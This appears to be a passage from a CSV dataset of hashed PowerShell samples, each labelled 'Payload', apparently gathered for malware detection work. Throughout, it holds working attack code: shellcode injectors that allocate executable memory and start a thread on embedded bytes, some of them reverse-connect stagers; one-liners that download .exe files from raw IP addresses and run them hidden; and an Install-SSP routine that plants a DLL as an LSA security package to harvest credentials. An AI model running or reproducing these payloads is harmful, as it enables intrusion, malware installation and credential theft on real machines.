73,0x14,0x55,0x3a,0xdc,0xe7,0xb0,0x31,0xd5,0x7d,0x7b,0x2d,0x1a,0x92,0x7b,0xad,0x4c,0xf8,0x7b,0xc5,0x28,0x58,0x28,0xf0,0x36,0x75,0x5c,0xa9,0xa2,0x76,0x35,0x1e,0x64,0x1f,0xbb,0x79,0x42,0x80,0x44,0xac,0x52,0xfc,0x92,0x88,0x20,0xec,0x26;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
37021de4e23c20b6b631e9ffcbcfda930a401c9589ac8e615559d156ffc6c6fa,"
$A04m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $A04m -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd0,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x5a,0xbd,0x9e,0xd3,0xea,0xf2,0x31,0x68,0x17,0x03,0x68,0x17,0x83,0x5e,0xd7,0x08,0x07,0xa2,0x30,0x4e,0xe8,0x5a,0xc1,0x2f,0x60,0xbf,0xf0,0x6f,0x16,0xb4,0xa3,0x5f,0x5c,0x98,0x4f,0x2b,0x30,0x08,0xdb,0x59,0x9d,0x3f,0x6c,0xd7,0xfb,0x0e,0x6d,0x44,0x3f,0x11,0xed,0x97,0x6c,0xf1,0xcc,0x57,0x61,0xf0,0x09,0x85,0x88,0xa0,0xc2,0xc1,0x3f,0x54,0x66,0x9f,0x83,0xdf,0x34,0x31,0x84,0x3c,0x8c,0x30,0xa5,0x93,0x86,0x6a,0x65,0x12,0x4a,0x07,0x2c,0x0c,0x8f,0x22,0xe6,0xa7,0x7b,0xd8,0xf9,0x61,0xb2,0x21,0x55,0x4c,0x7a,0xd0,0xa7,0x89,0xbd,0x0b,0xd2,0xe3,0xbd,0xb6,0xe5,0x30,0xbf,0x6c,0x63,0xa2,0x67,0xe6,0xd3,0x0e,0x99,0x2b,0x85,0xc5,0x95,0x80,0xc1,0x81,0xb9,0x17,0x05,0xba,0xc6,0x9c,0xa8,0x6c,0x4f,0xe6,0x8e,0xa8,0x0b,0xbc,0xaf,0xe9,0xf1,0x13,0xcf,0xe9,0x59,0xcb,0x75,0x62,0x77,0x18,0x04,0x29,0x10,0xed,0x25,0xd1,0xe0,0x79,0x3d,0xa2,0xd2,0x26,0x95,0x2c,0x5f,0xae,0x33,0xab,0xa0,0x85,0x84,0x23,0x5f,0x26,0xf5,0x6a,0xa4,0x72,0xa5,0x04,0x0d,0xfb,0x2e,0xd4,0xb2,0x2e,0xe0,0x84,0x1c,0x81,0x41,0x74,0xdd,0x71,0x2a,0x9e,0xd2,0xae,0x4a,0xa1,0x38,0xc7,0x63,0x1d,0xc3,0xe8,0x73,0xee,0xb3,0x89,0x01,0x64,0x55,0x79,0xd2,0xaa,0xfb,0x12,0x37,0xdb,0x73,0xc3,0x25,0x72,0x0e,0x1b,0xf2,0xdc,0xb6,0x43,0x5a,0x84,0x1e,0x2c,0x02,0x6c,0xc7,0x94,0xea,0xd4,0xaf,0x7c,0x53,0xbc,0x17,0x25,0x3b,0x64,0xf0,0x8d,0xe3,0xcc,0x58,0x76,0x4c,0xb4,0x00,0xde,0x34,0x1c,0xe9,0x86,0x9c,0xc4,0x51,0x6f,0x45,0xac,0x39,0xd7,0x75,0x24,0x13,0xcf,0x41,0x34,0x9c,0xc5,0x21,0x74,0x7f,0x8c,0x30,0x24,0x17,0x52,0x3b,0xc5,0x5c,0xdb,0xdd,0xaf,0xb2,0x8a,0x76,0x47,0x2a,0x97,0x0d,0xf6,0xb3,0x0d,0x68,0x38,0x3f,0xa2,0x8c,0xf6,0xc8,0xcf,0x9e,0x6e,0x39,0x9a,0xfd,0x38,0x46,0x30,0x6b,0xc4,0xd2,0xbf,0x3a,0x93,0x4a,0xc2,0x1b,0xd3,0xd4,0x3d,0x4e,0x68,0xdc,0xab,0x31,0x06,0x21,0x3c,0xb2,0xd6,0x77,0x56,0xb2,0xbe,0x2f,0x02,0xe1,0xdb,0x2f,0x9f,0x95,0x70,0xba,0x20,0xcc,0x25,0x6d,0x49,0xf2,0x10,0x59,0xd6,0x0d,0x77,0x5b,0x2a,0xd8,0xb1,0x29,0x42,0xd8;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$nGP=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($nGP.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$nGP,0,0,0);for (;;){Start-sleep 60};

",Payload
5d18a6e0b98f8d1575ea206673cac2a98afc055ed997d08c3c78b184954b9ad4,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~harvy/scvhost.exe', $env:APPDATA\stvgs.exe );Start-Process ( $env:APPDATA\stvgs.exe )

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
6261e70b85f1e673c1b724de151937f068556dc4e2859a61a5f66836acec1de6,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x5e,0xe4,0xae,0xfc,0xdb,0xc5,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x7a,0x0f,0x03,0x7a,0x51,0x06,0x5b,0x00,0x85,0x44,0xa4,0xf9,0x55,0x29,0x2c,0x1c,0x64,0x69,0x4a,0x54,0xd6,0x59,0x18,0x38,0xda,0x12,0x4c,0xa9,0x69,0x56,0x59,0xde,0xda,0xdd,0xbf,0xd1,0xdb,0x4e,0x83,0x70,0x5f,0x8d,0xd0,0x52,0x5e,0x5e,0x25,0x92,0xa7,0x83,0xc4,0xc6,0x70,0xcf,0x7b,0xf7,0xf5,0x85,0x47,0x7c,0x45,0x0b,0xc0,0x61,0x1d,0x2a,0xe1,0x37,0x16,0x75,0x21,0xb9,0xfb,0x0d,0x68,0xa1,0x18,0x2b,0x22,0x5a,0xea,0xc7,0xb5,0x8a,0x23,0x27,0x19,0xf3,0x8c,0xda,0x63,0x33,0x2a,0x05,0x16,0x4d,0x49,0xb8,0x21,0x8a,0x30,0x66,0xa7,0x09,0x92,0xed,0x1f,0xf6,0x23,0x21,0xf9,0x7d,0x2f,0x8e,0x8d,0xda,0x33,0x11,0x41,0x51,0x4f,0x9a,0x64,0xb6,0xc6,0xd8,0x42,0x12,0x83,0xbb,0xeb,0x03,0x69,0x6d,0x13,0x53,0xd2,0xd2,0xb1,0x1f,0xfe,0x07,0xc8,0x7d,0x96,0xe4,0xe1,0x7d,0x66,0x63,0x71,0x0d,0x54,0x2c,0x29,0x99,0xd4,0xa5,0xf7,0x5e,0x1b,0x9c,0x40,0xf0,0xe2,0x1f,0xb1,0xd8,0x20,0x4b,0xe1,0x72,0x81,0xf4,0x6a,0x83,0x2e,0x21,0x06,0x86,0xb8,0x7f,0xe5,0x17,0x63,0xe8,0x08,0x28,0x94,0x38,0x85,0xce,0xca,0xe8,0xc6,0x5e,0xaa,0x58,0xa7,0x0e,0x42,0xb3,0x28,0x70,0x72,0xbc,0xe2,0x19,0x18,0x53,0x5b,0x71,0xb4,0xca,0xc6,0x09,0x25,0x12,0xdd,0x77,0x65,0x98,0xd2,0x88,0x2b,0x69,0x9e,0x9a,0xdb,0x99,0xd5,0xc1,0x4d,0xa5,0xc3,0x6c,0x71,0x33,0xe8,0x26,0x26,0xab,0xf2,0x1f,0x00,0x74,0x0c,0x4a,0x1b,0xbd,0x98,0x35,0x73,0xc2,0x4c,0xb6,0x83,0x94,0x06,0xb6,0xeb,0x40,0x73,0xe5,0x0e,0x8f,0xae,0x99,0x83,0x1a,0x51,0xc8,0x70,0x8c,0x39,0xf6,0xaf,0xfa,0xe5,0x09,0x9a,0xfa,0xda,0xdf,0xe2,0x88,0x32,0xdc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
3eb0f5d0eaf9a7692b4b7642e4985e00716f9ef49765c2db0740889ef94ea23d,"function Install-SSP
{


    [CmdletBinding()] Param (
        [ValidateScript({Test-Path (Resolve-Path $_)})]
        [String]
        $Path
    )

    $Principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()

    if(-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        throw 'Installing an SSP dll requires administrative rights. Execute this script from an elevated PowerShell prompt.'
    }

    
    $FullDllPath = Resolve-Path $Path

    
    function local:Get-PEArchitecture
    {
        Param
        (
            [Parameter( Position = 0,
                        Mandatory = $True )]
            [String]
            $Path
        )
    
        
        $FileStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
    
        [Byte[]] $MZHeader = New-Object Byte[](2)
        $FileStream.Read($MZHeader,0,2) | Out-Null
    
        $Header = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
        if ($Header -ne 'MZ')
        {
            $FileStream.Close()
            Throw 'Invalid PE header.'
        }
    
        
        $FileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null
    
        [Byte[]] $lfanew = New-Object Byte[](4)
    
        
        $FileStream.Read($lfanew,0,4) | Out-Null
        $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | % { $_.ToString('X2') } ) -join ''))
    
        
        $FileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
        [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)
    
        
        $FileStream.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
        $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | % { $_.ToString('X2') } ) -join '')
        $FileStream.Close()
    
        if (($Architecture -ne '014C') -and ($Architecture -ne '8664'))
        {
            Throw 'Invalid PE header or unsupported architecture.'
        }
    
        if ($Architecture -eq '014C')
        {
            Write-Output '32-bit'
        }
        elseif ($Architecture -eq '8664')
        {
            Write-Output '64-bit'
        }
        else
        {
            Write-Output 'Other'
        }
    }

    $DllArchitecture = Get-PEArchitecture $FullDllPath

    $OSArch = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture

    if ($DllArchitecture -ne $OSArch)
    {
        throw 'The operating system architecture must match the architecture of the SSP dll.'
    }

    $Dll = Get-Item $FullDllPath | Select-Object -ExpandProperty Name

    
    
    $DllName = $Dll | % { % {($_ -split '\.')[0]} }

    
    $SecurityPackages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' |
        Select-Object -ExpandProperty 'Security Packages'

    if ($SecurityPackages -contains $DllName)
    {
        throw ""'$DllName' is already present in HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages.""
    }

    
    $NativeInstallDir = ""$($Env:windir)\Sysnative""

    if (Test-Path $NativeInstallDir)
    {
        $InstallDir = $NativeInstallDir
    }
    else
    {
        $InstallDir = ""$($Env:windir)\System32""
    }

    if (Test-Path (Join-Path $InstallDir $Dll))
    {
        throw ""$Dll is already installed in $InstallDir.""
    }

    
    Copy-Item $FullDllPath $InstallDir

    $SecurityPackages += $DllName

    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages

    $DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False)

    $TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage',
        'secur32.dll',
        'Public, Static',
        [Reflection.CallingConventions]::Standard,
        [Int32],
        [Type[]] @([String], [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)

    $Secur32 = $TypeBuilder.CreateType()

    if ([IntPtr]::Size -eq 4) {
        $StructSize = 20
    } else {
        $StructSize = 24
    }

    $StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize)
    [Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize)

    $RuntimeSuccess = $True

    try {
        $Result = $Secur32::AddSecurityPackage($DllName, $StructPtr)
    } catch {
        $HResult = $Error[0].Exception.InnerException.HResult
        Write-Warning ""Runtime loading of the SSP failed. (0x$($HResult.ToString('X8')))""
        Write-Warning ""Reason: $(([ComponentModel.Win32Exception] $HResult).Message)""
        $RuntimeSuccess = $False
    }

    if ($RuntimeSuccess) {
        Write-Verbose 'Installation and loading complete!'
    } else {
        Write-Verbose 'Installation complete! Reboot for changes to take effect.'
    }
}",Payload
2009124c67dff1b10dbd62cb4aa2a56352558096579799df885eb012ee0aec41,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x1b,0xb6,0x18,0xa4,0xda,0xde,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0x14,0x54,0xed,0x58,0xc2,0x1a,0x0e,0xa1,0x12,0x7b,0x86,0x44,0x23,0xbb,0xfc,0x0d,0x13,0x0b,0x76,0x43,0x9f,0xe0,0xda,0x70,0x14,0x84,0xf2,0x77,0x9d,0x23,0x25,0xb9,0x1e,0x1f,0x15,0xd8,0x9c,0x62,0x4a,0x3a,0x9d,0xac,0x9f,0x3b,0xda,0xd1,0x52,0x69,0xb3,0x9e,0xc1,0x9e,0xb0,0xeb,0xd9,0x15,0x8a,0xfa,0x59,0xc9,0x5a,0xfc,0x48,0x5c,0xd1,0xa7,0x4a,0x5e,0x36,0xdc,0xc2,0x78,0x5b,0xd9,0x9d,0xf3,0xaf,0x95,0x1f,0xd2,0xfe,0x56,0xb3,0x1b,0xcf,0xa4,0xcd,0x5c,0xf7,0x56,0xb8,0x94,0x04,0xea,0xbb,0x62,0x77,0x30,0x49,0x71,0xdf,0xb3,0xe9,0x5d,0xde,0x10,0x6f,0x15,0xec,0xdd,0xfb,0x71,0xf0,0xe0,0x28,0x0a,0x0c,0x68,0xcf,0xdd,0x85,0x2a,0xf4,0xf9,0xce,0xe9,0x95,0x58,0xaa,0x5c,0xa9,0xbb,0x15,0x00,0x0f,0xb7,0xbb,0x55,0x22,0x9a,0xd3,0x9a,0x0f,0x25,0x23,0xb5,0x18,0x56,0x11,0x1a,0xb3,0xf0,0x19,0xd3,0x1d,0x06,0x5e,0xce,0xda,0x98,0xa1,0xf1,0x1a,0xb0,0x65,0xa5,0x4a,0xaa,0x4c,0xc6,0x00,0x2a,0x71,0x13,0xbc,0x2f,0xe5,0x22,0xc1,0xd0,0xdf,0x32,0xc0,0x10,0x3b,0x72,0x4d,0xf6,0x13,0x24,0x1e,0xa7,0xd3,0x94,0xde,0x17,0xbb,0xfe,0xd0,0x48,0xdb,0x00,0x3b,0xe1,0x71,0xef,0x92,0x59,0xed,0x96,0xbe,0x12,0x8c,0x57,0x15,0x5f,0x8e,0xdc,0x9a,0x9f,0x40,0x15,0xd6,0xb3,0x34,0xd5,0xad,0xee,0x92,0xea,0x1b,0x84,0x1a,0x7f,0xa0,0x0f,0x4d,0x17,0xaa,0x76,0xb9,0xb8,0x55,0x5d,0xb2,0x71,0xc0,0x1e,0xac,0x7d,0x04,0x9f,0x2c,0x28,0x4e,0x9f,0x44,0x8c,0x2a,0xcc,0x71,0xd3,0xe6,0x60,0x2a,0x46,0x09,0xd1,0x9f,0xc1,0x61,0xdf,0xc6,0x26,0x2e,0x20,0x2d,0xb7,0x12,0xf7,0x0b,0xcd,0x7a,0xcb;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
2061d98b6bb4f490a28cddec9454ee80bafe0a669fde6c44a8ae3262e3d0fb19,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
445a4e81ad763a4fa2ed1f6744b2028358ff8d70945433659a9bcad5dc0cb640,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
403b4f4a2863cb920291377b52b2fad80873b6529a1c44d9c501e0390b078778,"
$n8ZT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $n8ZT -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcc,0xb8,0x25,0xd1,0x07,0x6d,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x18,0x03,0x42,0x18,0x83,0xc2,0x21,0x33,0xf2,0x91,0xc1,0x31,0xfd,0x69,0x11,0x56,0x77,0x8c,0x20,0x56,0xe3,0xc4,0x12,0x66,0x67,0x88,0x9e,0x0d,0x25,0x39,0x15,0x63,0xe2,0x4e,0x9e,0xce,0xd4,0x61,0x1f,0x62,0x24,0xe3,0xa3,0x79,0x79,0xc3,0x9a,0xb1,0x8c,0x02,0xdb,0xac,0x7d,0x56,0xb4,0xbb,0xd0,0x47,0xb1,0xf6,0xe8,0xec,0x89,0x17,0x69,0x10,0x59,0x19,0x58,0x87,0xd2,0x40,0x7a,0x29,0x37,0xf9,0x33,0x31,0x54,0xc4,0x8a,0xca,0xae,0xb2,0x0c,0x1b,0xff,0x3b,0xa2,0x62,0x30,0xce,0xba,0xa3,0xf6,0x31,0xc9,0xdd,0x05,0xcf,0xca,0x19,0x74,0x0b,0x5e,0xba,0xde,0xd8,0xf8,0x66,0xdf,0x0d,0x9e,0xed,0xd3,0xfa,0xd4,0xaa,0xf7,0xfd,0x39,0xc1,0x03,0x75,0xbc,0x06,0x82,0xcd,0x9b,0x82,0xcf,0x96,0x82,0x93,0xb5,0x79,0xba,0xc4,0x16,0x25,0x1e,0x8e,0xba,0x32,0x13,0xcd,0xd2,0xf7,0x1e,0xee,0x22,0x90,0x29,0x9d,0x10,0x3f,0x82,0x09,0x18,0xc8,0x0c,0xcd,0x5f,0xe3,0xe9,0x41,0x9e,0x0c,0x0a,0x4b,0x64,0x58,0x5a,0xe3,0x4d,0xe1,0x31,0xf3,0x72,0x34,0xaf,0xf6,0xe4,0x77,0x98,0xee,0x76,0x1f,0xdb,0x10,0x67,0xbc,0x52,0xf6,0xd7,0x6c,0x35,0xa7,0x97,0xdc,0xf5,0x17,0x7f,0x37,0xfa,0x48,0x9f,0x38,0xd0,0xe0,0x35,0xd7,0x8d,0x59,0xa1,0x4e,0x94,0x12,0x50,0x8e,0x02,0x5f,0x52,0x04,0xa1,0x9f,0x1c,0xed,0xcc,0xb3,0xc8,0x1d,0x9b,0xee,0x5e,0x21,0x31,0x84,0x5e,0xb7,0xbe,0x0f,0x09,0x2f,0xbd,0x76,0x7d,0xf0,0x3e,0x5d,0xf6,0x39,0xab,0x1e,0x60,0x46,0x3b,0x9f,0x70,0x10,0x51,0x9f,0x18,0xc4,0x01,0xcc,0x3d,0x0b,0x9c,0x60,0xee,0x9e,0x1f,0xd1,0x43,0x08,0x48,0xdf,0xba,0x7e,0xd7,0x20,0xe9,0x7e,0